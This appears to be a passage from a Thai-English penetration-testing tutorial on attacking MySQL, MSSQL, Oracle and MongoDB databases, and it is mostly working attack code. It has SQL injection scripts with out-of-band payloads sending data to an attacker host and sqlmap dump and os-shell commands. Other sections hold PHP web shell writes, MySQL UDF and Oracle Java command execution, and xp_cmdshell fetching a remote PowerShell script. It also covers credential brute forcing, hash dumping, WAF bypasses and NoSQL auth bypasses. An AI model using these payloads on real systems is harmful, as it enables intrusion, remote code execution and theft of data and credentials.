# Part 38: Database Security Testing (Steps 371-380)

## Step 371: SQL Injection Fundamentals

เทคนิค SQL injection ที่ครบถ้วนสำหรับ pen testers

```python
#!/usr/bin/env python3
# sqli_fundamentals.py - SQL Injection Techniques

import requests
import urllib.parse
import string
import time
from typing import Optional

class SQLInjectionTester:
    def __init__(self, target_url: str, session: requests.Session = None):
        self.url = target_url
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
        self.vulnerable = False
        self.db_type = None
        
    def test_basic_injection(self, param: str) -> bool:
        """Test for basic SQL injection"""
        print(f"[*] Testing basic SQLi on parameter: {param}")
        
        payloads = [
            "'",
            "'--",
            "' OR '1'='1",
            "\"--",
            "\" OR \"1\"=\"1",
            "'#",
            "') OR ('1'='1",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",  # Error = orders exists
            "1 AND 1=1",
            "1 AND 1=2",
        ]
        
        error_signatures = [
            "SQL syntax", "syntax error", "mysql_fetch",
            "ORA-", "ODBC SQL", "SQLite", "Microsoft OLE DB",
            "Unclosed quotation", "PDOException", "pg_",
            "Warning: mysql", "MySQLi", "MSSQL"
        ]
        
        baseline = self.session.get(f"{self.url}?{param}=1").text
        
        for payload in payloads:
            url = f"{self.url}?{param}={urllib.parse.quote(payload)}"
            try:
                resp = self.session.get(url, timeout=10)
                
                # Check for SQL errors
                for sig in error_signatures:
                    if sig.lower() in resp.text.lower():
                        print(f"  [!] SQL error found with payload: {payload}")
                        print(f"      Error signature: {sig}")
                        self.vulnerable = True
                        self._detect_db_type(resp.text)
                        return True
                
                # Check for difference in response
                if len(resp.text) != len(baseline):
                    print(f"  [!] Response difference with: {payload}")
                    
            except Exception as e:
                print(f"  Error: {e}")
        
        print("  [-] No basic SQLi found")
        return False
    
    def _detect_db_type(self, response_text: str) -> str:
        """Detect database type from error messages"""
        db_signatures = {
            "MySQL": ["mysql", "MariaDB", "You have an error in your SQL syntax"],
            "PostgreSQL": ["postgresql", "pg_", "ERROR: syntax error at"],
            "MSSQL": ["Microsoft SQL", "ODBC", "OLE DB", "mssql"],
            "Oracle": ["ORA-", "Oracle", "PLS-"],
            "SQLite": ["SQLite", "sqlite3"]
        }
        
        for db, sigs in db_signatures.items():
            for sig in sigs:
                if sig.lower() in response_text.lower():
                    self.db_type = db
                    print(f"  [+] Detected: {db}")
                    return db
        return "Unknown"
    
    def union_based_injection(self, param: str, num_columns: int = None) -> dict:
        """UNION-based SQL injection"""
        print(f"[*] UNION-based SQLi on: {param}")
        results = {}
        
        # หาจำนวน columns
        if not num_columns:
            for cols in range(1, 20):
                payload = f"1' ORDER BY {cols}--"
                url = f"{self.url}?{param}={urllib.parse.quote(payload)}"
                resp = self.session.get(url, timeout=10)
                if "error" in resp.text.lower() or resp.status_code == 500:
                    num_columns = cols - 1
                    print(f"  [+] Number of columns: {num_columns}")
                    break
        
        if not num_columns:
            return results
        
        # หา column ที่แสดง output
        null_cols = ','.join(['NULL'] * num_columns)
        for i in range(num_columns):
            cols = ['NULL'] * num_columns
            cols[i] = "'SQLI_TEST'"
            payload = f"0' UNION SELECT {','.join(cols)}--"
            url = f"{self.url}?{param}={urllib.parse.quote(payload)}"
            resp = self.session.get(url, timeout=10)
            if "SQLI_TEST" in resp.text:
                print(f"  [+] Output column index: {i}")
                results["output_col"] = i
                
                # Extract database info
                db_payloads = {
                    "version": f"0' UNION SELECT {','.join(['NULL']*num_columns).replace('NULL', 'version()', 1)}--",
                    "user": f"0' UNION SELECT {','.join(['NULL']*num_columns).replace('NULL', 'user()', 1)}--",
                    "database": f"0' UNION SELECT {','.join(['NULL']*num_columns).replace('NULL', 'database()', 1)}--"
                }
                
                for info_type, db_payload in db_payloads.items():
                    resp = self.session.get(f"{self.url}?{param}={urllib.parse.quote(db_payload)}", timeout=10)
                    # Parse response for extracted data
                    results[info_type] = "[extracted from response]"
                
                break
        
        return results
    
    def blind_boolean_injection(self, param: str) -> str:
        """Boolean-based blind SQL injection"""
        print(f"[*] Boolean-based blind SQLi on: {param}")
        
        def test_condition(condition: str) -> bool:
            """Returns True if condition is true (affects response)"""
            true_payload = f"1' AND {condition}--"
            false_payload = f"1' AND NOT {condition}--"
            
            true_resp = self.session.get(f"{self.url}?{param}={urllib.parse.quote(true_payload)}", timeout=10)
            false_resp = self.session.get(f"{self.url}?{param}={urllib.parse.quote(false_payload)}", timeout=10)
            
            return len(true_resp.text) != len(false_resp.text)
        
        # Extract database name char by char
        db_name = ""
        for pos in range(1, 30):
            for char in string.printable[:95]:
                condition = f"SUBSTRING(database(),{pos},1)='{char}'"
                if test_condition(condition):
                    db_name += char
                    print(f"  [+] DB name so far: {db_name}")
                    break
            else:
                break  # No matching char = end of string
        
        print(f"  [+] Database name: {db_name}")
        return db_name
    
    def time_based_blind_injection(self, param: str) -> str:
        """Time-based blind SQL injection"""
        print(f"[*] Time-based blind SQLi on: {param}")
        
        delay_threshold = 3  # seconds
        
        def test_condition(condition: str) -> bool:
            payload = f"1'; IF ({condition}) WAITFOR DELAY '0:0:3'--"  # MSSQL
            # MySQL: ' AND IF(condition, SLEEP(3), 0)--
            # Oracle: ' AND 1=CASE WHEN (condition) THEN 1 ELSE (SELECT 1 FROM DUAL WHERE 1=(SELECT 1 FROM (SELECT SLEEP(3) FROM DUAL) T)) END--
            
            start = time.time()
            self.session.get(f"{self.url}?{param}={urllib.parse.quote(payload)}", timeout=10)
            elapsed = time.time() - start
            
            return elapsed >= delay_threshold
        
        # Extract database version
        db_version = ""
        for pos in range(1, 30):
            for char in string.printable[:95]:
                condition = f"SUBSTRING(@@version,{pos},1)='{char}'"
                if test_condition(condition):
                    db_version += char
                    print(f"  [+] Version so far: {db_version}")
                    break
            else:
                break
        
        return db_version
    
    def out_of_band_injection(self, param: str, attacker_ip: str) -> str:
        """Out-of-band SQLi via DNS/HTTP"""
        print(f"[*] OOB SQLi on: {param}")
        
        # MySQL
        payload_mysql = f"1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.{attacker_ip}\\\\test'))--"
        # MSSQL
        payload_mssql = f"1'; EXEC master..xp_dirtree '\\\\{attacker_ip}\\' + (SELECT TOP 1 name FROM master..sysdatabases)+'\\\\test'--"
        # Oracle
        payload_oracle = f"1' UNION SELECT UTL_HTTP.request('http://{attacker_ip}/?data='||user FROM DUAL--"
        
        print(f"  MySQL: {payload_mysql}")
        print(f"  MSSQL: {payload_mssql}")
        print(f"  Oracle: {payload_oracle}")
        print(f"  Monitor DNS queries at: {attacker_ip}")
        
        return payload_mssql


# SQLMap usage
SQLMAP_COMMANDS = """
# SQLMap - Automated SQL Injection

# Basic detection
sqlmap -u "http://target.com/page?id=1"

# POST parameter
sqlmap -u "http://target.com/login" --data="user=test&pass=test" -p user

# Cookie injection
sqlmap -u "http://target.com/" --cookie="session=abc123" -p session

# Custom header
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dbs  # List databases
sqlmap -u "http://target.com/page?id=1" -D mydb --tables  # List tables
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump  # Dump table

# Full dump
sqlmap -u "http://target.com/page?id=1" --dump-all

# OS commands (MSSQL xp_cmdshell)
sqlmap -u "http://target.com/page?id=1" --os-shell

# File operations
sqlmap -u "http://target.com/page?id=1" --file-read=/etc/passwd
sqlmap -u "http://target.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase,space2comment
sqlmap -u "http://target.com/page?id=1" --random-agent --tor

# Specify DB type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --level=5 --risk=3

# Batch mode (no user interaction)
sqlmap -u "http://target.com/page?id=1" --batch --dump
"""

if __name__ == "__main__":
    tester = SQLInjectionTester("http://target.com/page")
    # tester.test_basic_injection("id")
    # tester.union_based_injection("id")
    print(SQLMAP_COMMANDS)
```

## Step 372: Advanced SQL Injection

เทคนิค SQL injection ขั้นสูงและ WAF bypass

```python
#!/usr/bin/env python3
# advanced_sqli.py - Advanced SQL Injection Techniques

import requests
import urllib.parse
import base64
import random
import string

class AdvancedSQLI:
    
    def second_order_injection(self):
        """Second-order SQL injection"""
        print("[*] Second-Order SQL Injection:")
        print("""
    1. บันทึกข้อมูลที่เป็น payload ไว้ใน DB (register username: admin'--)
    2. Application ไม่ execute SQL ตอนนี้ (escaped correctly)
    3. ทีหลัง อ่านกลับไปใช้ใน query อื่น (change password for: admin'--)
    4. SQL injection เกิดขึ้นใน query ที่  2
    
    Example:
    - Register: username = "admin'--"
    - DB stores: admin'--
    - Change password query:
      UPDATE users SET password='new' WHERE username='admin'--'
      Executes as: UPDATE users SET password='new' WHERE username='admin'
      => Changes admin's password!
    """)
    
    def stored_procedure_injection(self):
        """Stored procedure exploitation"""
        payloads = {
            "MSSQL xp_cmdshell": [
                "'; EXEC xp_cmdshell 'whoami'--",
                "'; EXEC master..xp_cmdshell 'powershell -enc BASE64'--",
                "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
            ],
            "MySQL file read": [
                "' UNION SELECT LOAD_FILE('/etc/passwd')--",
                "' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--"
            ],
            "MySQL file write": [
                "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
                "' UNION SELECT 0x3c3f70687020...  INTO DUMPFILE '/var/www/shell.php'--"
            ],
            "PostgreSQL": [
                "'; COPY (SELECT '') TO PROGRAM 'id';--",  # SUPERUSER only
                "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE C STRICT; SELECT system('id');--"
            ]
        }
        
        for db, payloads_list in payloads.items():
            print(f"\n  {db}:")
            for p in payloads_list[:2]:
                print(f"    {p}")
    
    def waf_bypass_techniques(self, payload: str) -> list:
        """WAF bypass transformations"""
        bypasses = []
        
        # Case variation
        bypasses.append(payload.swapcase())
        bypasses.append(payload.upper())
        bypasses.append(payload.lower())
        
        # Comment insertion
        def comment_insert(p):
            return p.replace(" ", "/**/")
        bypasses.append(comment_insert(payload))
        
        # URL encoding
        bypasses.append(urllib.parse.quote(payload))
        bypasses.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encode
        
        # HTML entity encoding
        bypasses.append(payload.replace("'", "&#39;"))
        
        # Hex encoding
        def hex_encode_word(word):
            return '0x' + word.encode().hex()
        
        # Space alternatives
        space_alts = ["\t", "\n", "\r", "\x0c", "\x0b", "+", "/**/", "//", "--"]
        for alt in space_alts:
            bypasses.append(payload.replace(" ", alt))
        
        # Keyword alternatives
        keyword_bypasses = {
            "SELECT": ["SEL/**/ECT", "SEL\x0dECT", "S%E%L%E%C%T"],
            "UNION": ["UN/**/ION", "UNION\x0d", "UnIoN"],
            "FROM": ["FR/**/OM", "FR\x0dOM"],
            "WHERE": ["WH/**/ERE", "WHERE\x0d"],
            "OR": ["||"]
        }
        
        return bypasses
    
    def nosql_injection(self):
        """NoSQL injection techniques"""
        print("[*] NoSQL Injection Techniques:")
        
        # MongoDB injection
        mongodb_payloads = [
            # Authentication bypass
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            # Operator injection
            '{"username": "admin", "password": {"$regex": ".*"}}',
            # Array injection
            '{"username": ["admin", "administrator"], "password": {"$ne": ""}}',
            # Where injection
            '{"$where": "this.username == \'admin\'"}'
        ]
        
        print("  MongoDB payloads:")
        for p in mongodb_payloads:
            print(f"    {p}")
        
        # HTTP parameter pollution for NoSQL
        print("\n  HTTP parameter pollution:")
        print("    POST: username=admin&password[$ne]=invalid")
        print("    URL: ?id[$gt]=0")
        print("    JSON: {\"user\": \"a\", \"$where\": \"1==1\"}")
        
        # Tools
        print("\n  Tools:")
        print("    NoSQLMap: python3 nosqlmap.py")
        print("    nosql-injection-payload-list: https://github.com/swisskyrepo/PayloadsAllTheThings")
    
    def xss_via_sqli(self):
        """XSS through SQL injection"""
        payloads = [
            "1' UNION SELECT '<script>alert(1)</script>'--",
            "1' UNION SELECT '<img src=x onerror=alert(1)>'--",
            "1'; UPDATE users SET email='<script>alert(document.cookie)</script>' WHERE username='admin'--"
        ]
        
        print("[*] XSS via SQL Injection:")
        for p in payloads:
            print(f"  {p}")


# SQLi Payloads by DB type
SQLI_PAYLOADS = """
=== MySQL/MariaDB ===
# Version
' UNION SELECT @@version--
# User
' UNION SELECT user()--
# Databases
' UNION SELECT group_concat(schema_name) FROM information_schema.schemata--
# Tables
' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
# Columns
' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
# Data
' UNION SELECT group_concat(username,':',password) FROM users--
# File read
' UNION SELECT load_file('/etc/passwd')--
# Time based
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--

=== MSSQL ===
# Version
' UNION SELECT @@version--
# User
' UNION SELECT SYSTEM_USER--
# Databases  
' UNION SELECT name FROM master..sysdatabases--
# Tables
' UNION SELECT table_name FROM information_schema.tables--
# OS Command
'; EXEC xp_cmdshell 'dir c:\\'--
# Time based
'; WAITFOR DELAY '0:0:5'--

=== Oracle ===
# Version
' UNION SELECT banner FROM v$version--
# User
' UNION SELECT user FROM DUAL--
# Tables  
' UNION SELECT table_name FROM all_tables--
# Time based
' AND 1=CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5) FROM DUAL) T) END--

=== PostgreSQL ===
# Version
' UNION SELECT version()--
# User
' UNION SELECT current_user--
# Databases
' UNION SELECT datname FROM pg_database--
# OS Command (superuser)
'; COPY (SELECT '') TO PROGRAM 'id';--
' ; COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;--
# Time based
'; SELECT pg_sleep(5);--
"""

if __name__ == "__main__":
    adv = AdvancedSQLI()
    adv.second_order_injection()
    adv.stored_procedure_injection()
    adv.nosql_injection()
    print(SQLI_PAYLOADS)
```

## Step 373: MySQL Security Testing

การทดสอบความปลอดภัยของ MySQL database

```bash
#!/bin/bash
# mysql_security.sh - MySQL Security Testing

# ========== MySQL Authentication Testing ==========

test_mysql_auth() {
    local host=$1
    local port=${2:-3306}
    
    echo "[*] Testing MySQL authentication on $host:$port"
    
    # ทดสอบ default credentials
    local credentials=(
        "root:"
        "root:root"
        "root:password"
        "root:mysql"
        "root:admin"
        "mysql:mysql"
        "admin:admin"
    )
    
    for cred in "${credentials[@]}"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        if mysql -h $host -P $port -u $user -p"$pass" -e "SELECT 1;" 2>/dev/null; then
            echo "[+] Found credentials: $user:$pass"
            break
        fi
    done
    
    # Nmap script
    nmap -p $port --script mysql-brute --script-args userdb=/usr/share/ncrack/minimal.usr,passdb=/usr/share/wordlists/rockyou.txt $host
}

# ========== MySQL Privilege Analysis ==========

analyze_mysql_privileges() {
    local user=$1
    local pass=$2
    local host=${3:-localhost}
    
    echo "[*] Analyzing MySQL privileges for $user@$host"
    
    # ตรวจสอป privileges
    mysql -h $host -u $user -p"$pass" 2>/dev/null <<'EOF'
-- Current user and privileges
SELECT user(), @@version;
SHOW GRANTS FOR CURRENT_USER();

-- All users
SELECT user, host, authentication_string FROM mysql.user;

-- Check for powerful privileges
SELECT user, host FROM mysql.user WHERE Super_priv='Y' OR File_priv='Y' OR Grant_priv='Y';

-- Databases
SHOW DATABASES;

-- Global variables
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'general_log%';
SHOW VARIABLES LIKE 'bind_address';
SHOW VARIABLES LIKE 'skip_grant_tables';
EOF
}

# ========== MySQL Data Exfiltration ==========

exfiltrate_mysql() {
    local user=$1
    local pass=$2
    local host=${3:-localhost}
    local db=$4
    
    echo "[*] Exfiltrating data from MySQL $db"
    
    # Dump password hashes
    mysql -h $host -u $user -p"$pass" 2>/dev/null <<EOF
USE $db;
-- หา users table
SELECT table_name FROM information_schema.tables WHERE table_schema='$db';

-- เลือก likely tables
SELECT * FROM users LIMIT 10;
SELECT * FROM admin LIMIT 10;
SELECT * FROM accounts LIMIT 10;

-- MySQL system hashes
SELECT user, authentication_string FROM mysql.user;
EOF
    
    # Dump via mysqldump
    mysqldump -h $host -u $user -p"$pass" --all-databases > /tmp/mysql_dump.sql 2>/dev/null
    echo "[+] Dump saved to /tmp/mysql_dump.sql"
    
    # Check for file read/write privileges
    mysql -h $host -u $user -p"$pass" 2>/dev/null <<'EOF'
-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/mysqld.cnf');

-- Write file (requires FILE privilege and write access)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
EOF
}

# ========== MySQL UDF Exploitation ==========

mysql_udf_privesc() {
    local user=$1
    local pass=$2
    local host=${3:-localhost}
    
    echo "[*] MySQL UDF privilege escalation"
    
    # ที่สำคัญ: ต้องมี FILE privilege และ MySQL รันเป็น root
    
    mysql -h $host -u $user -p"$pass" 2>/dev/null <<'EOF'
-- ตรวจสอบ plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
SHOW VARIABLES LIKE 'secure_file_priv';

-- สร้าง table สำหรับเก็บ binary
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/udf.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- สร้าง function
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';

-- รัน command
SELECT sys_exec('id > /tmp/out.txt');
SELECT sys_exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash');
EOF
    
    echo "[*] Tools: sqlmap --os-shell, metasploit mysql_udf_payload"
}

# ========== Metasploit MySQL Modules ==========

echo "Metasploit MySQL modules:"
cat <<'EOF'
# MySQL version scan
use auxiliary/scanner/mysql/mysql_version
set RHOSTS <target>
run

# MySQL login brute force
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target>
set USER_FILE /usr/share/ncrack/minimal.usr
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# MySQL hashdump
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS <target>
set USERNAME root
set PASSWORD root
run

# MySQL file read
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS <target>
set USERNAME root
set PASSWORD root
run

# UDF injection
use exploit/linux/mysql/mysql_udf_payload
set RHOSTS <target>
set USERNAME root
set PASSWORD root
run
EOF
```

## Step 374: MSSQL Security Testing

การทดสอบ Microsoft SQL Server

```python
#!/usr/bin/env python3
# mssql_security.py - MSSQL Security Testing

import subprocess
import socket
import struct

# ต้องติดตั้ง: pip install pymssql impacket

class MSSQLTester:
    def __init__(self, host: str, port: int = 1433):
        self.host = host
        self.port = port
        self.conn = None
        
    def connect(self, username: str, password: str, database: str = "master") -> bool:
        """Connect to MSSQL"""
        try:
            import pymssql
            self.conn = pymssql.connect(
                server=self.host,
                port=self.port,
                user=username,
                password=password,
                database=database
            )
            print(f"[+] Connected to MSSQL as {username}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def query(self, sql: str) -> list:
        """Execute query and return results"""
        cursor = self.conn.cursor()
        cursor.execute(sql)
        return cursor.fetchall()
    
    def check_privileges(self) -> dict:
        """Check current user privileges"""
        print("[*] Checking MSSQL privileges...")
        
        checks = {
            "version": "SELECT @@VERSION",
            "user": "SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin')",
            "databases": "SELECT name FROM master..sysdatabases",
            "linked_servers": "SELECT name FROM sys.servers WHERE is_linked=1",
            "xpcmdshell": "SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'"
        }
        
        results = {}
        for name, query in checks.items():
            try:
                result = self.query(query)
                results[name] = result
                print(f"  {name}: {result}")
            except Exception as e:
                results[name] = f"Error: {e}"
        
        return results
    
    def enable_xpcmdshell(self) -> bool:
        """Enable xp_cmdshell (requires sysadmin)"""
        print("[*] Enabling xp_cmdshell...")
        
        commands = [
            "EXEC sp_configure 'show advanced options', 1",
            "RECONFIGURE",
            "EXEC sp_configure 'xp_cmdshell', 1",
            "RECONFIGURE"
        ]
        
        try:
            for cmd in commands:
                self.query(cmd)
            print("[+] xp_cmdshell enabled!")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False
    
    def execute_os_command(self, command: str) -> str:
        """Execute OS command via xp_cmdshell"""
        print(f"[*] Executing: {command}")
        
        try:
            result = self.query(f"EXEC xp_cmdshell '{command}'")
            output = '\n'.join([r[0] for r in result if r[0]])
            return output
        except Exception as e:
            return f"Error: {e}"
    
    def dump_hashes(self) -> list:
        """Dump MSSQL password hashes"""
        print("[*] Dumping MSSQL hashes...")
        
        query = """
        SELECT name, type_desc, password_hash 
        FROM sys.sql_logins
        WHERE type = 'S'
        """
        
        try:
            hashes = self.query(query)
            for name, type_desc, hash_val in hashes:
                if hash_val:
                    print(f"  {name}: {hash_val.hex() if hash_val else 'NULL'}")
            return hashes
        except Exception as e:
            print(f"  Error: {e}")
            return []
    
    def linked_server_attack(self) -> list:
        """Exploit linked servers for lateral movement"""
        print("[*] Linked server attacks...")
        
        # ค้นหา linked servers
        try:
            linked = self.query("SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked=1")
            
            for server in linked:
                print(f"  Linked server: {server[0]}")
                
                # รัน query ผ่าน linked server
                try:
                    result = self.query(f"SELECT * FROM OPENQUERY([{server[0]}], 'SELECT SYSTEM_USER')")
                    print(f"    Remote user: {result}")
                    
                    # รัน xp_cmdshell ผ่าน linked server
                    cmd_result = self.query(f"""
                        EXEC ('{{
                            EXEC sp_configure \'show advanced options\', 1;
                            RECONFIGURE;
                            EXEC sp_configure \'xp_cmdshell\', 1;
                            RECONFIGURE;
                        }}') AT [{server[0]}]
                    """)
                except:
                    pass
            
            return linked
        except Exception as e:
            return []
    
    def impersonate_user(self, target_user: str) -> bool:
        """Impersonate another SQL login"""
        print(f"[*] Attempting to impersonate: {target_user}")
        
        # ตรวจสอบ impersonation rights
        check = self.query(f"""
            SELECT 1 FROM sys.server_permissions 
            WHERE permission_name = 'IMPERSONATE' 
            AND grantee_principal_id = SUSER_SID('{target_user}')
        """)
        
        if check:
            try:
                self.query(f"EXECUTE AS LOGIN = '{target_user}'")
                result = self.query("SELECT SYSTEM_USER")
                print(f"[+] Now executing as: {result[0][0]}")
                return True
            except Exception as e:
                print(f"[-] Impersonation failed: {e}")
        
        return False


# MSSQL attack commands
MSSQL_ATTACKS = """
# MSSQL reconnaissance
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <target>

# Brute force
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt <target>

# Metasploit
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum  
use auxiliary/admin/mssql/mssql_exec  # xp_cmdshell
use auxiliary/admin/mssql/mssql_sql
use exploit/windows/mssql/mssql_payload  # MeterPreter via xp_cmdshell

# impacket mssqlclient
mssqlclient.py sa:password@target -windows-auth
mssqlclient.py DOMAIN/user:password@target -windows-auth

# xp_cmdshell
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'powershell IEX(IWR http://attacker/shell.ps1)';

# Python mssql3
python3 -c "
import pymssql
conn = pymssql.connect('target', 'sa', 'password', 'master')
cur = conn.cursor()
cur.execute(\"EXEC xp_cmdshell 'whoami'\")
print(cur.fetchall())
"
"""

if __name__ == "__main__":
    tester = MSSQLTester("192.168.1.100")
    if tester.connect("sa", "password"):
        tester.check_privileges()
        tester.enable_xpcmdshell()
        print(tester.execute_os_command("whoami"))
        tester.dump_hashes()
    print(MSSQL_ATTACKS)
```

## Step 375: Oracle Database Security

```bash
#!/bin/bash
# oracle_security.sh - Oracle Database Security Testing

# ========== Oracle Reconnaissance ==========

oracle_recon() {
    local host=$1
    local port=${2:-1521}
    
    echo "[*] Oracle reconnaissance on $host:$port"
    
    # tnscmd - enumerate Oracle TNS listener
    tnscmd10g version -p $port -h $host
    tnscmd10g status -p $port -h $host
    tnscmd10g services -p $port -h $host
    
    # nmap Oracle scripts
    nmap -p $port --script oracle-tns-version,oracle-sid-brute $host
    
    # Brute force SIDs (database names)
    nmap -p $port --script oracle-sid-brute --script-args oracle-sid-brute.sid=/usr/share/nmap/nselib/data/oracle-sids $host
    
    # oscanner
    oscanner -s $host -P $port -v
}

# ========== Oracle Authentication ==========

oracle_auth_test() {
    local host=$1
    local sid=${2:-ORCL}
    
    echo "[*] Testing Oracle authentication..."
    
    # Default credentials
    local default_creds=(
        "sys:change_on_install"
        "system:manager"
        "dbsnmp:dbsnmp"
        "outln:outln"
        "scott:tiger"
        "hr:hr"
        "oe:oe"
        "sh:sh"
    )
    
    for cred in "${default_creds[@]}"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        echo "Testing $user:$pass..."
        sqlplus -s $user/$pass@$host:1521/$sid <<< "SELECT 1 FROM DUAL;" 2>&1 | head -2
    done
    
    # Metasploit brute
    echo "Metasploit: use auxiliary/admin/oracle/oracle_login"
}

# ========== Oracle Post-Authentication ==========

oracle_enum() {
    local user=$1
    local pass=$2
    local host=$3
    local sid=$4
    
    sqlplus -s $user/$pass@$host:1521/$sid << 'SQLEOF'
-- Version
SELECT * FROM v$version;

-- Current user and privileges
SELECT USER FROM DUAL;
SELECT * FROM SESSION_PRIVS;
SELECT * FROM SESSION_ROLES;

-- All users
SELECT username, account_status, default_tablespace FROM dba_users;

-- Password hashes
SELECT name, password, spare4 FROM sys.user$ WHERE type# != 0;

-- Public synonyms for privilege escalation
SELECT name, table_owner, table_name FROM all_synonyms WHERE table_name IN ('UTL_FILE','UTL_HTTP','UTL_TCP','DBMS_ADVISOR','DBMS_XMLQUERY');

-- Java stored procedures
SELECT name FROM all_objects WHERE object_type='JAVA CLASS' AND name LIKE '%os%';

-- Linked database links
SELECT owner, db_link, username, host FROM all_db_links;
SQLEOF
}

oracle_privesc() {
    local user=$1
    local pass=$2
    local host=$3
    local sid=$4
    
    echo "[*] Oracle privilege escalation..."
    
    sqlplus -s $user/$pass@$host:1521/$sid << 'SQLEOF'
-- Java stored procedure OS execution
-- Requires CREATE SESSION + GRANT JAVA privileges

EXEC dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');

CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OsCommand" AS
import java.io.*;
public class OsCommand {
  public static String execCmd(String cmd) throws IOException {
    String line;
    StringBuilder output = new StringBuilder();
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    while ((line = reader.readLine()) != null) output.append(line).append("\n");
    return output.toString();
  }
};
/

CREATE OR REPLACE FUNCTION OSRUN(cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA
NAME 'OsCommand.execCmd(java.lang.String) return java.lang.String';
/

SELECT OSRUN('id') FROM DUAL;
SELECT OSRUN('cat /etc/passwd') FROM DUAL;
SQLEOF
}

echo "Oracle Tools:"
echo "  oscanner: oscanner -s target"
echo "  tnscmd10g: tnscmd10g ping -h target"
echo "  odat: odat all -s target -d SID"
echo "  sqlplus: sqlplus user/pass@host:1521/SID"
echo "  Metasploit: use exploit/multi/oracle/oracle_login"
```

## Step 376: MongoDB และ NoSQL Security

```python
#!/usr/bin/env python3
# nosql_security.py - NoSQL Database Security Testing

import socket
import json
import struct
import requests

class MongoDBTester:
    def __init__(self, host: str, port: int = 27017):
        self.host = host
        self.port = port
        
    def check_unauthenticated_access(self) -> bool:
        """Check if MongoDB allows unauthenticated access"""
        print(f"[*] Testing MongoDB unauthenticated access on {self.host}:{self.port}")
        
        try:
            from pymongo import MongoClient
            client = MongoClient(self.host, self.port, serverSelectionTimeoutMS=5000)
            # Force connection
            dbs = client.list_database_names()
            print(f"[+] VULNERABLE: Unauthenticated access! Found {len(dbs)} databases:")
            for db in dbs:
                print(f"    - {db}")
            return True
        except Exception as e:
            print(f"[-] Not vulnerable or connection failed: {e}")
            return False
    
    def enumerate_databases(self, client) -> dict:
        """Enumerate all databases and collections"""
        print("[*] Enumerating databases...")
        
        findings = {}
        for db_name in client.list_database_names():
            db = client[db_name]
            collections = db.list_collection_names()
            findings[db_name] = {}
            
            for coll_name in collections:
                coll = db[coll_name]
                count = coll.count_documents({})
                findings[db_name][coll_name] = count
                
                # สรุป sample
                if count > 0:
                    sample = coll.find_one()
                    keys = list(sample.keys()) if sample else []
                    
                    # หา sensitive fields
                    sensitive = [k for k in keys if any(
                        s in k.lower() for s in ['password', 'secret', 'token', 'key', 'hash', 'credit']
                    )]
                    if sensitive:
                        print(f"  [!] Sensitive fields in {db_name}.{coll_name}: {sensitive}")
        
        return findings
    
    def extract_credentials(self, client) -> list:
        """Extract credential data"""
        creds = []
        
        for db_name in client.list_database_names():
            db = client[db_name]
            for coll_name in db.list_collection_names():
                coll = db[coll_name]
                
                # หา password fields
                for doc in coll.find({}, {"_id": 0}).limit(100):
                    for key, value in doc.items():
                        if any(s in key.lower() for s in ['password', 'passwd', 'secret', 'hash']):
                            creds.append({
                                "db": db_name,
                                "collection": coll_name,
                                "field": key,
                                "value": str(value)[:50]
                            })
        
        return creds


class NoSQLInjection:
    def __init__(self, target_url: str):
        self.url = target_url
